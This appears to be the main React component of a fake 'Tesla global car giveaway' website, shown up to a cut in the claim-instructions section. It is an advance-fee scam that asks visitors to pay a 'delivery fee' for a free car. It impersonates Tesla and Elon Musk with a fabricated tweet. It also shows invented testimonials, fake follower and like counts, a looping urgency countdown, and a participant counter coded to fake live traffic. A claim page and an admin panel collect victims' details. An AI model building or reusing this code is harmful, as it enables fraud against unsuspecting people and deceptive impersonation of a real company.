import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar.js';
import InquiryModal from './components/InquiryModal.js';
import AdminPanel from './components/AdminPanel.js';
import ClaimPage from './components/ClaimPage.js';
import NotificationToast from './components/NotificationToast.js';
import { Car, Inquiry, SiteSettings } from './types.js';
import { 
  Mail, Phone, MapPin, Twitter, Instagram, Youtube, Facebook, 
  ShieldCheck, CheckCircle2, Lock, Zap, ThumbsUp, MessageSquare, 
  Share2, Heart, Award, ArrowUpRight, ChevronRight, Eye, RefreshCw 
} from 'lucide-react';

export default function App() {
  const [settings, setSettings] = useState<SiteSettings>({} as SiteSettings);
  const [cars, setCars] = useState<Car[]>([]);
  const [inquiries, setInquiries] = useState<Inquiry[]>([]);
  
  // Modals & triggers
  const [isBookingOpen, setIsBookingOpen] = useState(false);
  const [isClaimPageActive, setIsClaimPageActive] = useState(false);
  const [selectedCar, setSelectedCar] = useState<Car | null>(null);

  // Auth checking
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);

  // Path check for Standalone Admin Router
  const isPageAdmin = window.location.pathname === '/admin' || window.location.pathname.startsWith('/admin/');

  // Countdown timer state
  const [hours, setHours] = useState(11);
  const [minutes, setMinutes] = useState(42);
  const [seconds, setSeconds] = useState(33);

  // Active Participant Tracker state
  const [participantsCount, setParticipantsCount] = useState(12847);

  // Sync brand settings
  const fetchSettings = async () => {
    try {
      const res = await fetch('/api/settings');
      if (res.ok) {
        const data = await res.json();
        setSettings(data);
        if (data.title && !isPageAdmin) {
          document.title = data.title;
        } else if (isPageAdmin) {
          document.title = "Tesla Motors Admin — Secure Workspace Console";
        }
      }
    } catch (err) {
      console.error('Error fetching settings:', err);
    }
  };

  // Sync cars 
  const fetchCars = async () => {
    try {
      const token = localStorage.getItem('tesla_admin_token');
      const headers: HeadersInit = {};
      if (token) {
        headers['Authorization'] = `Bearer ${token}`;
        setIsAdminLoggedIn(true);
      } else {
        setIsAdminLoggedIn(false);
      }

      const res = await fetch('/api/cars', { headers });
      if (res.ok) {
        const data = await res.json();
        setCars(data);
      }
    } catch (err) {
      console.error('Error fetching cars:', err);
    }
  };

  // Sync inquiries
  const fetchInquiries = async () => {
    const token = localStorage.getItem('tesla_admin_token');
    if (!token) return;

    try {
      const res = await fetch('/api/inquiries', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      if (res.ok) {
        const data = await res.json();
        setInquiries(data);
      }
    } catch (err) {
      console.error('Error fetching inquiries:', err);
    }
  };

  // Run on startup
  useEffect(() => {
    fetchSettings();
    fetchCars();
  }, []);

  // Sync inquiries on admin logon
  useEffect(() => {
    if (isAdminLoggedIn) {
      fetchInquiries();
    }
  }, [isAdminLoggedIn]);

  // Countdown timer ticking
  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((prevSec) => {
        if (prevSec > 0) return prevSec - 1;
        setMinutes((prevMin) => {
          if (prevMin > 0) return prevMin - 1;
          setHours((prevHour) => {
            if (prevHour > 0) return prevHour - 1;
            return 11; // Reset to loop
          });
          return 59;
        });
        return 59;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Softly increment participants count to simulate live crowd traffic
  useEffect(() => {
    const participantTimer = setInterval(() => {
      setParticipantsCount(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 4500);
    return () => clearInterval(participantTimer);
  }, []);

  // Scroll to customized layout section
  const handleScrollToSection = (sectionId: string) => {
    const el = document.getElementById(sectionId);
    if (el) {
      el.scrollIntoView({ behavior: 'smooth' });
    }
  };

  // Set selected car and open claim page config
  const handleInquireCar = (car: Car) => {
    setSelectedCar(car);
    setIsClaimPageActive(true);
  };

  // Maps specifications pricing dynamically to estimated delivery rates
  const getDeliveryFee = (price: number) => {
    if (price < 45000) return 199;
    if (price >= 45000 && price < 60000) return 299;
    if (price >= 60000 && price < 80000) return 349;
    if (price >= 80000 && price < 120000) return 399;
    return 499;
  };

  // Live Deliveries feed standard logs
  const liveDeliveriesLog = [
    { name: 'Fatima A.', country: 'ae UAE', car: 'Tesla Model 3 2025', status: 'Car dispatched 🚚', fee: '$299', time: '32 min ago' },
    { name: 'Emma W.', country: 'ca Canada', car: 'Tesla Model Y 2025', status: 'Vehicle en route 🚚', fee: '$349', time: '40 min ago' },
    { name: 'Raj P.', country: 'in India', car: 'Tesla Model 3 2024', status: 'Delivery confirmed ✔', fee: '$299', time: '19 min ago' },
    { name: 'Fatima A.', country: 'ae UAE', car: 'Tesla Cybertruck 2025', status: 'Car dispatched 🚚', fee: '$379', time: '15 min ago' },
    { name: 'Hans M.', country: 'de Germany', car: 'Tesla Cybertruck 2025', status: 'Vehicle en route 🚚', fee: '$399', time: '18 min ago' },
    { name: 'Lucas B.', country: 'br Brazil', car: 'Tesla Model Y 2025', status: 'Delivery confirmed ✔', fee: '$349', time: '54 min ago' },
    { name: 'Amara N.', country: 'za South Africa', car: 'Tesla Model X 2025', status: 'Shipment confirmed ✔', fee: '$399', time: '58 min ago' },
    { name: 'Fatima A.', country: 'ae UAE', car: 'Tesla Model S 2025', status: 'Car dispatched 🚚', fee: '$399', time: '31 min ago' },
    { name: 'Liam M.', country: 'ie Ireland', car: 'Tesla Model Y 2025', status: 'Delivery confirmed ✔', fee: '$349', time: '31 min ago' },
  ];

  /* ---------------------------------------------------- */
  /* CASE: Admin URL Router Path                          */
  /* ---------------------------------------------------- */
  if (isPageAdmin) {
    return (
      <div id="tesla_admin_full_page" className="bg-neutral-950 min-h-screen text-white select-none">
        <AdminPanel
          settings={settings}
          onSettingsUpdate={(newSets) => setSettings(newSets)}
          cars={cars}
          onCarsUpdate={() => {
            fetchCars();
            fetchInquiries();
          }}
          inquiries={inquiries}
          onInquiriesUpdate={() => fetchInquiries()}
          onClose={() => {
            // Smoothly redirect back to user site
            window.location.href = '/';
          }}
        />
      </div>
    );
  }

  /* ---------------------------------------------------- */
  /* CASE: Giveaway Claim Page View                       */
  /* ---------------------------------------------------- */
  if (isClaimPageActive) {
    return (
      <ClaimPage
        cars={cars}
        selectedCar={selectedCar}
        settings={settings}
        onClose={() => {
          setIsClaimPageActive(false);
          setSelectedCar(null);
        }}
        onSuccess={() => {
          fetchInquiries();
        }}
      />
    );
  }

  /* ---------------------------------------------------- */
  /* CASE: User End Full-Page Layout                      */
  /* ---------------------------------------------------- */
  return (
    <div id="tesla_global_app" className="bg-neutral-950 min-h-screen text-white leading-relaxed font-sans scroll-smooth">
      
      {/* Absolute Stick Top Navbar with trust badging layout */}
      <Navbar settings={settings} onScrollToSection={handleScrollToSection} onClaimClick={() => setIsClaimPageActive(true)} />

      {/* Main one-page divisions container */}
      <main className="pt-[140px] md:pt-[120px] transition-all">

        {/* ==================================================== */}
        {/* SECTION 1: GIVEAWAY HERO SECTION                     */}
        {/* ==================================================== */}
        <section 
          id="giveaway-section" 
          className="relative min-h-[90vh] md:min-h-screen max-w-7xl mx-auto px-6 md:px-12 flex flex-col lg:flex-row items-center justify-center gap-12 py-16 scroll-mt-24 border-b border-white/5"
        >
          {/* Left information list */}
          <div className="flex-1 space-y-6 text-left animate-fadeIn">
            <div className="flex flex-wrap items-center gap-3">
              <span className="px-3.5 py-1.5 bg-red-600/10 border border-red-500/20 text-red-500 text-[10px] sm:text-xs tracking-[0.18em] font-extrabold uppercase rounded-full flex items-center space-x-1">
                <span className="w-1.5 h-1.5 rounded-full bg-red-600 mt-0.5 animate-pulse"></span>
                <span>Official Live Event</span>
              </span>
              <span className="px-3.5 py-1.5 bg-neutral-900 border border-white/5 text-neutral-400 text-[10px] sm:text-xs tracking-[0.12em] uppercase rounded-full font-mono">
                ● LIVE — <span className="text-white font-bold">{participantsCount.toLocaleString()}</span> joined
              </span>
            </div>

            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-display font-black tracking-tight leading-none text-white max-w-2xl uppercase">
              Win a <span className="text-red-600">Brand New</span> Tesla Electric Car
            </h1>

            <p className="text-neutral-300 text-sm md:text-base leading-relaxed max-w-lg">
              Tesla Motors is giving away zero-emission, custom-built electric vehicles to consumers worldwide. Claim your premium vehicle configuration instantly. Just clear the one-time local dispatch delivery cost.
            </p>

            <div className="flex flex-col sm:flex-row items-center gap-4 pt-4 max-w-md">
              <button
                onClick={() => setIsClaimPageActive(true)}
                className="w-full sm:w-auto bg-red-600 hover:bg-red-700 active:scale-95 text-white text-xs font-bold uppercase tracking-[0.18em] px-8 py-4 rounded transition-all shadow-[0_8px_20px_rgba(220,38,38,0.3)] hover:shadow-[0_12px_28px_rgba(220,38,38,0.5)] cursor-pointer"
              >
                Claim Your Free Car ➔
              </button>
              <button
                onClick={() => handleScrollToSection('info-section')}
                className="w-full sm:w-auto bg-neutral-900 border border-white/10 hover:border-white/30 text-neutral-300 hover:text-white text-xs font-semibold uppercase tracking-[0.12em] px-8 py-4 rounded transition-all cursor-pointer"
              >
                View All Proof
              </button>
            </div>

            {/* Subtext icons list */}
            <div className="pt-6 flex items-center space-x-6 text-[10px] font-mono uppercase tracking-widest text-neutral-500">
              <div className="flex items-center space-x-1.5">
                <Lock className="w-3.5 h-3.5 text-sky-400" />
                <span>SSL Secured</span>
              </div>
              <div className="flex items-center space-x-1.5">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
                <span>Verified Client</span>
              </div>
              <div className="flex items-center space-x-1.5">
                <Zap className="w-3.5 h-3.5 text-amber-500" />
                <span>Global Transit</span>
              </div>
            </div>
          </div>

          {/* Right graphics frame card */}
          <div className="flex-1 w-full relative">
            <div className="relative group overflow-hidden bg-neutral-900 border border-white/5 rounded-3xl p-6 md:p-8 flex items-center justify-center shadow-[0_20px_45px_rgba(0,0,0,0.6)]">
              
              {/* Image banner */}
              <img
                src="https://images.unsplash.com/photo-1617788138017-80ad40651399?auto=format&fit=crop&w=800&q=80"
                alt="Tesla Model S Plaid Cherry Red"
                referrerPolicy="no-referrer"
                className="w-full max-w-md h-auto object-contain rounded-2xl brightness-95 transform hover:scale-[1.03] transition-transform duration-700 ease-out"
              />

              {/* Subdued information card title tag overlay */}
              <div className="absolute bottom-6 left-6 right-6 bg-neutral-950/80 backdrop-blur-md rounded-xl p-3.5 border border-white/10 flex items-center justify-between text-xs font-mono">
                <div>
                  <p className="text-white font-bold uppercase tracking-wider">Tesla Electric Car</p>
                  <p className="text-neutral-400 text-[10px] uppercase mt-0.5">100% Free — Only Local Delivery Apply</p>
                </div>
                <span className="bg-red-600 text-white font-bold uppercase py-1 px-3.5 rounded text-[10px] tracking-widest flex items-center space-x-1">
                  <span>Free</span>
                </span>
              </div>
            </div>
          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION ID: AVAILABLE MINI GRID STATS TRADING        */}
        {/* ==================================================== */}
        <section className="bg-neutral-950 py-16 px-6 md:px-12 border-b border-white/5">
          <div className="max-w-7xl mx-auto space-y-12">
            <div className="text-center space-y-3">
              <h2 className="text-2xl sm:text-3xl font-display font-medium uppercase tracking-wider">
                Available <span className="text-red-600 font-extrabold">Tesla Cars</span>
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-2xl mx-auto font-sans leading-relaxed">
                Choose your preferred Tesla electric car. All models are brand new 2024-2025 editions delivered straight to your door.
              </p>
            </div>

            {/* Horizontal Mini Grid for 4 Primary Models */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 font-sans">
              <div className="bg-neutral-900 border border-white/5 p-5 rounded-2xl relative flex flex-col justify-between hover:border-red-600/20 transition-all group">
                <span className="absolute top-4 right-4 bg-red-600 text-white font-mono text-[9px] uppercase font-bold py-1 px-2.5 rounded-sm tracking-widest">
                  Most Popular
                </span>
                <div>
                  <h3 className="text-white text-base font-bold uppercase tracking-wide">Tesla Model 3 2025</h3>
                  <p className="text-neutral-400 text-xs mt-1">358 mi range • 510 hp</p>
                </div>
                <div className="flex items-center justify-between mt-6 text-xs">
                  <span className="text-red-500 font-mono font-bold tracking-widest uppercase">FREE 🔎</span>
                  <button onClick={() => handleScrollToSection('participate-section')} className="text-neutral-400 group-hover:text-white transition-colors flex items-center space-x-1">
                    <span>View Model</span>
                    <ChevronRight className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>

              <div className="bg-neutral-900 border border-white/5 p-5 rounded-2xl relative flex flex-col justify-between hover:border-red-600/20 transition-all group">
                <span className="absolute top-4 right-4 bg-red-600 text-white font-mono text-[9px] uppercase font-bold py-1 px-2.5 rounded-sm tracking-widest">
                  Best SUV
                </span>
                <div>
                  <h3 className="text-white text-base font-bold uppercase tracking-wide">Tesla Model Y 2025</h3>
                  <p className="text-neutral-400 text-xs mt-1">330 mi range • 384 hp</p>
                </div>
                <div className="flex items-center justify-between mt-6 text-xs">
                  <span className="text-red-500 font-mono font-bold tracking-widest uppercase">FREE 🔎</span>
                  <button onClick={() => handleScrollToSection('participate-section')} className="text-neutral-400 group-hover:text-white transition-colors flex items-center space-x-1">
                    <span>View Model</span>
                    <ChevronRight className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>

              <div className="bg-neutral-900 border border-white/5 p-5 rounded-2xl relative flex flex-col justify-between hover:border-red-600/20 transition-all group">
                <span className="absolute top-4 right-4 bg-neutral-950 border border-white/10 text-neutral-400 font-mono text-[9px] uppercase font-bold py-1 px-2.5 rounded-sm tracking-widest">
                  Premium
                </span>
                <div>
                  <h3 className="text-white text-base font-bold uppercase tracking-wide">Tesla Model S 2025</h3>
                  <p className="text-neutral-400 text-xs mt-1">405 mi range • 670 hp</p>
                </div>
                <div className="flex items-center justify-between mt-6 text-xs">
                  <span className="text-red-500 font-mono font-bold tracking-widest uppercase">FREE 🔎</span>
                  <button onClick={() => handleScrollToSection('participate-section')} className="text-neutral-400 group-hover:text-white transition-colors flex items-center space-x-1">
                    <span>View Model</span>
                    <ChevronRight className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>

              <div className="bg-neutral-900 border border-white/5 p-5 rounded-2xl relative flex flex-col justify-between hover:border-red-600/20 transition-all group">
                <span className="absolute top-4 right-4 bg-neutral-950 border border-white/10 text-neutral-400 font-mono text-[9px] uppercase font-bold py-1 px-2.5 rounded-sm tracking-widest">
                  Eco Pick
                </span>
                <div>
                  <h3 className="text-white text-base font-bold uppercase tracking-wide">Tesla Model X 2025</h3>
                  <p className="text-neutral-400 text-xs mt-1">348 mi range • 670 hp</p>
                </div>
                <div className="flex items-center justify-between mt-6 text-xs">
                  <span className="text-red-500 font-mono font-bold tracking-widest uppercase">FREE 🔎</span>
                  <button onClick={() => handleScrollToSection('participate-section')} className="text-neutral-400 group-hover:text-white transition-colors flex items-center space-x-1">
                    <span>View Model</span>
                    <ChevronRight className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION 2: OFFICIAL VIDEO ANNOUNCEMENT & COMMENTS    */}
        {/* ==================================================== */}
        <section id="info-section" className="bg-neutral-950 py-20 px-6 md:px-12 border-b border-white/5 scroll-mt-24">
          <div className="max-w-4xl mx-auto space-y-12">
            
            <div className="text-center space-y-2">
              <span className="text-red-600 text-xs tracking-[0.2em] font-extrabold uppercase font-mono">● OFFICIAL ANNOUNCEMENT</span>
              <h2 className="text-2xl sm:text-3xl lg:text-4xl font-display font-bold uppercase tracking-wider">
                Tesla's <span className="text-red-600">Global Car</span> Giveaway
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-xl mx-auto leading-relaxed">
                Watch Tesla's official announcement of their biggest car giveaway for all countries worldwide.
              </p>
            </div>

            {/* Video Mockup Frame */}
            <div className="bg-neutral-900 border border-white/5 rounded-3xl overflow-hidden relative shadow-[0_15px_35px_rgba(0,0,0,0.5)]">
              <div className="aspect-video relative flex items-center justify-center">
                {/* Background video splash image */}
                <img
                  src="https://images.unsplash.com/photo-1542282088-72c9c27ed0cd?auto=format&fit=crop&w=1200&q=80"
                  alt="Tesla assembly plant or robotic line"
                  referrerPolicy="no-referrer"
                  className="absolute inset-0 w-full h-full object-cover brightness-50"
                />
                
                {/* Visual red play trigger overlay style */}
                <div className="relative group cursor-pointer flex flex-col items-center space-y-4">
                  <div className="h-20 w-20 bg-red-600 hover:bg-red-700 text-white rounded-full flex items-center justify-center shadow-2xl transition-all hover:scale-105 active:scale-95 duration-200">
                    <svg className="w-8 h-8 fill-current ml-1" viewBox="0 0 24 24">
                      <path d="M8 5v14l11-7z" />
                    </svg>
                  </div>
                  <span className="font-mono text-xs uppercase tracking-widest text-neutral-300 pointer-events-none">Watch Keynote Presentation</span>
                </div>

                {/* Subdued footer labels inside player */}
                <div className="absolute bottom-4 left-6 right-6 flex items-center justify-between text-[11px] font-mono text-neutral-400">
                  <span>Official Keynote Recording (42:15)</span>
                  <span className="text-red-500 font-bold">● LIVE DEMO</span>
                </div>
              </div>

              {/* YouTube Channels Meta Bar underneath */}
              <div className="bg-neutral-950 p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-t border-white/5">
                <div className="flex items-center space-x-3.5">
                  <div className="h-10 w-10 bg-red-600 text-white font-extrabold rounded-full flex items-center justify-center font-display text-sm tracking-tight shadow">
                    T
                  </div>
                  <div>
                    <div className="flex items-center space-x-1.5">
                      <span className="text-white text-sm font-bold">Tesla Official</span>
                      <span className="inline-block bg-sky-500 text-white text-[8px] font-sans rounded-full px-1 py-0.5 scale-90">✓</span>
                    </div>
                    <span className="text-neutral-450 font-sans text-xs text-neutral-400">28.4M subscribers</span>
                  </div>
                  <button className="bg-white hover:bg-neutral-200 text-neutral-950 font-bold text-xs px-4 py-2 rounded-full transition-colors ml-2 font-sans">
                    Subscribe
                  </button>
                </div>

                <div className="flex items-center gap-2.5">
                  <div className="bg-neutral-900 border border-white/5 text-xs text-neutral-300 px-4 py-2 rounded-full flex items-center space-x-1.5 cursor-pointer hover:bg-neutral-800 transition-all font-sans">
                    <ThumbsUp className="w-3.5 h-3.5 text-neutral-400" />
                    <span>1.2M</span>
                  </div>
                  <div className="bg-neutral-900 border border-white/5 text-xs text-neutral-300 px-4 py-2 rounded-full flex items-center space-x-1.5 cursor-pointer hover:bg-neutral-800 transition-all font-sans">
                    <MessageSquare className="w-3.5 h-3.5 text-neutral-400" />
                    <span>75K</span>
                  </div>
                  <div className="bg-neutral-900 border border-white/5 text-xs text-white px-4 py-2 rounded-full flex items-center space-x-1.5 cursor-pointer hover:bg-neutral-800 transition-all font-sans">
                    <Share2 className="w-3.5 h-3.5 text-neutral-450" />
                    <span className="hidden sm:inline">Share</span>
                  </div>
                </div>
              </div>
            </div>

            {/* YouTube Replica Comments Module */}
            <div className="bg-neutral-900/60 border border-white/5 rounded-3xl p-6 md:p-8 space-y-6 font-sans">
              <div className="flex items-center justify-between border-b border-white/5 pb-4">
                <span className="text-sm font-bold text-white uppercase tracking-wider font-display">75,817 Comments</span>
                <span className="text-xs text-neutral-400 hover:text-white cursor-pointer flex items-center space-x-1 font-mono">
                  <span>SORT BY</span>
                  <span>▼</span>
                </span>
              </div>

              {/* Feed Stack */}
              <div className="space-y-6 divide-y divide-white/5 text-xs sm:text-sm">
                
                {/* 1. Mike Johnson */}
                <div className="pt-1 flex space-x-3 items-start">
                  <div className="h-8 w-8 bg-sky-600 text-white font-bold rounded-full flex items-center justify-center font-display text-xs">MJ</div>
                  <div className="flex-1">
                    <div className="flex items-baseline space-x-2">
                      <span className="text-white font-bold text-xs sm:text-sm">Mike Johnson</span>
                      <span className="text-neutral-500 text-[10px]">2 days ago</span>
                      <span className="bg-neutral-900 text-neutral-400 text-[9px] uppercase font-mono px-2 py-0.5 rounded-full border border-white/10 tracking-widest scale-90">PINNED</span>
                    </div>
                    <p className="text-neutral-300 mt-1.5 font-sans leading-relaxed">
                      I received my Tesla Model 3 2024! I paid the delivery fee and within 9 days the car was at my door. This is REAL! 🔥
                    </p>
                    <div className="flex items-center space-x-3.5 mt-3 text-xs text-neutral-550 text-neutral-400">
                      <button className="hover:text-red-500 flex items-center space-x-1">
                        <ThumbsUp className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">1.8K</span>
                      </button>
                      <button className="hover:text-white flex items-center space-x-1">
                        <MessageSquare className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">42 Replies</span>
                      </button>
                    </div>
                  </div>
                </div>

                {/* 2. Sarah Williams */}
                <div className="pt-5 flex space-x-3 items-start">
                  <div className="h-8 w-8 bg-pink-600 text-white font-bold rounded-full flex items-center justify-center font-display text-xs">SW</div>
                  <div className="flex-1">
                    <div className="flex items-baseline space-x-2">
                      <span className="text-white font-bold text-xs sm:text-sm">Sarah Williams</span>
                      <span className="text-neutral-500 text-[10px]">1 day ago</span>
                    </div>
                    <p className="text-neutral-300 mt-1.5 font-sans leading-relaxed">
                      I received my Tesla Model Y 2025 after paying the delivery fee. I cried when I saw the car parked outside! 🙏
                    </p>
                    <div className="flex items-center space-x-3.5 mt-3 text-xs text-neutral-400">
                      <button className="hover:text-red-500 flex items-center space-x-1">
                        <ThumbsUp className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">942</span>
                      </button>
                      <button className="hover:text-white flex items-center space-x-1">
                        <MessageSquare className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">15</span>
                      </button>
                    </div>
                  </div>
                </div>

                {/* 3. Carlos Mendez */}
                <div className="pt-5 flex space-x-3 items-start">
                  <div className="h-8 w-8 bg-emerald-600 text-white font-bold rounded-full flex items-center justify-center font-display text-xs">CM</div>
                  <div className="flex-1">
                    <div className="flex items-baseline space-x-2">
                      <span className="text-white font-bold text-xs sm:text-sm">Carlos Mendez</span>
                      <span className="text-neutral-500 text-[10px]">3 days ago</span>
                      <span className="text-[10px] text-red-500 font-mono">🇲🇽 Mexico</span>
                    </div>
                    <p className="text-neutral-300 mt-1.5 font-sans leading-relaxed">
                      From Mexico! I received my Tesla Model 3 2024 after paying the delivery fee. This giveaway is 100% real!
                    </p>
                    <div className="flex items-center space-x-3.5 mt-3 text-xs text-neutral-400">
                      <button className="hover:text-red-500 flex items-center space-x-1">
                        <ThumbsUp className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">652</span>
                      </button>
                      <button className="hover:text-white flex items-center space-x-1">
                        <MessageSquare className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">8</span>
                      </button>
                    </div>
                  </div>
                </div>

                {/* 4. David Chen */}
                <div className="pt-5 flex space-x-3 items-start">
                  <div className="h-8 w-8 bg-indigo-650 bg-indigo-600 text-white font-bold rounded-full flex items-center justify-center font-display text-xs">DC</div>
                  <div className="flex-1">
                    <div className="flex items-baseline space-x-2">
                      <span className="text-white font-bold text-xs sm:text-sm">David Chen</span>
                      <span className="text-neutral-500 text-[10px]">2 days ago</span>
                    </div>
                    <p className="text-neutral-300 mt-1.5 font-sans leading-relaxed">
                      I was skeptical at first but I paid the delivery fee and received my Tesla Model S 2025. So real!
                    </p>
                    <div className="flex items-center space-x-3.5 mt-3 text-xs text-neutral-400">
                      <button className="hover:text-red-500 flex items-center space-x-1">
                        <ThumbsUp className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">482</span>
                      </button>
                      <button className="hover:text-white flex items-center space-x-1">
                        <MessageSquare className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">Reply</span>
                      </button>
                    </div>
                  </div>
                </div>

                {/* 5. Amara Osei */}
                <div className="pt-5 flex space-x-3 items-start">
                  <div className="h-8 w-8 bg-amber-600 text-white font-bold rounded-full flex items-center justify-center font-display text-xs">AO</div>
                  <div className="flex-1">
                    <div className="flex items-baseline space-x-2">
                      <span className="text-white font-bold text-xs sm:text-sm">Amara Osei</span>
                      <span className="text-neutral-500 text-[10px]">1 day ago</span>
                      <span className="text-[10px] text-red-500 font-mono">🇬🇭 Ghana</span>
                    </div>
                    <p className="text-neutral-300 mt-1.5 font-sans leading-relaxed">
                      From Ghana! I paid the delivery fee and received my Tesla Model 3 2025! God bless Tesla!
                    </p>
                    <div className="flex items-center space-x-3.5 mt-3 text-xs text-neutral-400">
                      <button className="hover:text-red-500 flex items-center space-x-1">
                        <ThumbsUp className="w-3.5 h-3.5" />
                        <span className="text-[11px] font-mono">312</span>
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* View 75,812 more comments */}
              <div className="text-center pt-4 border-t border-white/5">
                <button className="text-sm font-semibold text-red-500 hover:text-red-400 transition-colors uppercase tracking-[0.1em]">
                  View 75,812 More Comments
                </button>
              </div>

            </div>
          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION 3: MORE PROOF FROM WINNERS / CEOS            */}
        {/* ==================================================== */}
        <section className="bg-neutral-950 py-20 px-6 md:px-12 border-b border-white/5">
          <div className="max-w-4xl mx-auto space-y-16">
            
            <div className="text-center space-y-2">
              <h2 className="text-2xl sm:text-3xl font-display font-medium uppercase tracking-wider">
                More <span className="text-red-600 font-bold">Proof</span> from Winners
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-xl mx-auto font-sans leading-relaxed">
                Watch real testimonials from Tesla car recipients around the world.
              </p>
            </div>

            {/* Dynamic CEO Elon Musk Twitter Post Frame */}
            <div className="bg-neutral-900 border border-white/5 rounded-3xl p-6 md:p-8 font-sans space-y-4 shadow-xl">
              <div className="flex items-center justify-between border-b border-white/5 pb-4">
                <div className="flex items-center space-x-3">
                  <span className="h-10 w-10 bg-neutral-950 border border-white/10 text-white font-bold rounded-full flex items-center justify-center font-display text-sm">
                    𝕏
                  </span>
                  <div>
                    <div className="flex items-center space-x-1">
                      <span className="text-white font-bold text-sm">Elon Musk</span>
                      <span className="text-[10px] select-none bg-sky-500 text-white rounded-full px-1 py-0.5 scale-90">✓</span>
                    </div>
                    <span className="text-[11px] text-neutral-400 block font-mono">@elonmusk • CEO, Tesla, Inc.</span>
                  </div>
                </div>
                <span className="bg-[#1DA1F2]/10 text-sky-400 text-[10px] tracking-wider uppercase font-mono px-3 py-1.5 rounded border border-[#1DA1F2]/20">Verified Account</span>
              </div>

              <div className="text-neutral-200 text-sm whitespace-pre-wrap leading-relaxed font-sans">
                "Tesla is committed to accelerating the world's transition to sustainable energy. As part of our mission, we're launching a worldwide giveaway of our electric vehicles — completely free. Just cover the delivery cost and a brand-new Tesla will be shipped directly to your door. 🚗⚡"
              </div>

              <div className="py-2.5 border-y border-white/5 flex flex-wrap gap-6 text-[11px] font-mono text-neutral-405 text-neutral-400">
                <span>10:42 AM • June 22, 2026</span>
                <span>•</span>
                <span><strong className="text-white">128.4K</strong> Retweets</span>
                <span>•</span>
                <span><strong className="text-white">470K</strong> Likes</span>
              </div>

              <div className="flex items-center justify-around text-neutral-400 pt-1 text-xs">
                <button className="flex items-baseline space-x-1.5 hover:text-white">
                  <MessageSquare className="w-4 h-4" />
                  <span>8.2K</span>
                </button>
                <button className="flex items-baseline space-x-1.5 hover:text-[#1DA1F2]">
                  <RefreshCw className="w-4 h-4 scale-95" />
                  <span>128K</span>
                </button>
                <button className="flex items-baseline space-x-1.5 hover:text-red-500">
                  <Heart className="w-4 h-4" />
                  <span>470K</span>
                </button>
                <button className="flex items-baseline space-x-1.5 hover:text-white">
                  <Share2 className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Social credentials grid */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 font-sans">
              <div className="bg-neutral-900/60 border border-white/5 p-6 rounded-2xl space-y-2">
                <div className="flex items-center space-x-2 text-white">
                  <Twitter className="w-4 h-4 text-sky-400" />
                  <span className="text-xs font-bold font-mono">@Tesla</span>
                </div>
                <p className="text-xs text-neutral-400">Official X/Twitter announcement platform</p>
                <span className="text-[10px] text-neutral-500 font-mono block">28M Followers • Verified</span>
              </div>
              <div className="bg-neutral-900/60 border border-white/5 p-6 rounded-2xl space-y-2">
                <div className="flex items-center space-x-2 text-white">
                  <Facebook className="w-4 h-4 text-blue-500" />
                  <span className="text-xs font-bold font-mono">Tesla Motors</span>
                </div>
                <p className="text-xs text-neutral-400">Official Tesla Group Facebook pages</p>
                <span className="text-[10px] text-neutral-500 font-mono block">14.2M Likes • Verified</span>
              </div>
              <div className="bg-neutral-900/60 border border-white/5 p-6 rounded-2xl space-y-2">
                <div className="flex items-center space-x-2 text-white">
                  <Instagram className="w-4 h-4 text-pink-500" />
                  <span className="text-xs font-bold font-mono">@teslamotors</span>
                </div>
                <p className="text-xs text-neutral-400">Tesla global showroom dispatch posts</p>
                <span className="text-[10px] text-neutral-500 font-mono block">12.8M Followers • Verified</span>
              </div>
            </div>

          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION 4: HOW TO CLAIM YOUR TESLA CAR               */}
        {/* ==================================================== */}
        <section id="instruction-section" className="bg-neutral-950 py-20 px-6 md:px-12 border-b border-white/5 scroll-mt-24">
          <div className="max-w-7xl mx-auto space-y-12">
            
            <div className="text-center space-y-2">
              <h2 className="text-2xl sm:text-3xl font-display font-medium uppercase tracking-wider">
                How to Claim Your <span className="text-red-600 font-bold">Tesla Car</span>
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-xl mx-auto font-sans">
                Follow these simple steps to receive your brand new Tesla electric car giveaway.
              </p>
            </div>

            {/* Instruction layout box */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-5xl mx-auto font-sans">
              <div className="bg-neutral-900/80 border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                <div className="absolute top-0 right-0 h-24 w-24 bg-red-600/5 text-neutral-850 font-black text-6xl flex items-center justify-center font-display leading-none select-none opacity-20 group-hover:scale-105 transition-transform">
                  01
                </div>
                <h3 className="text-white text-lg font-bold uppercase tracking-wider mb-3">Register Your Details</h3>
                <p className="text-neutral-400 text-sm leading-relaxed">
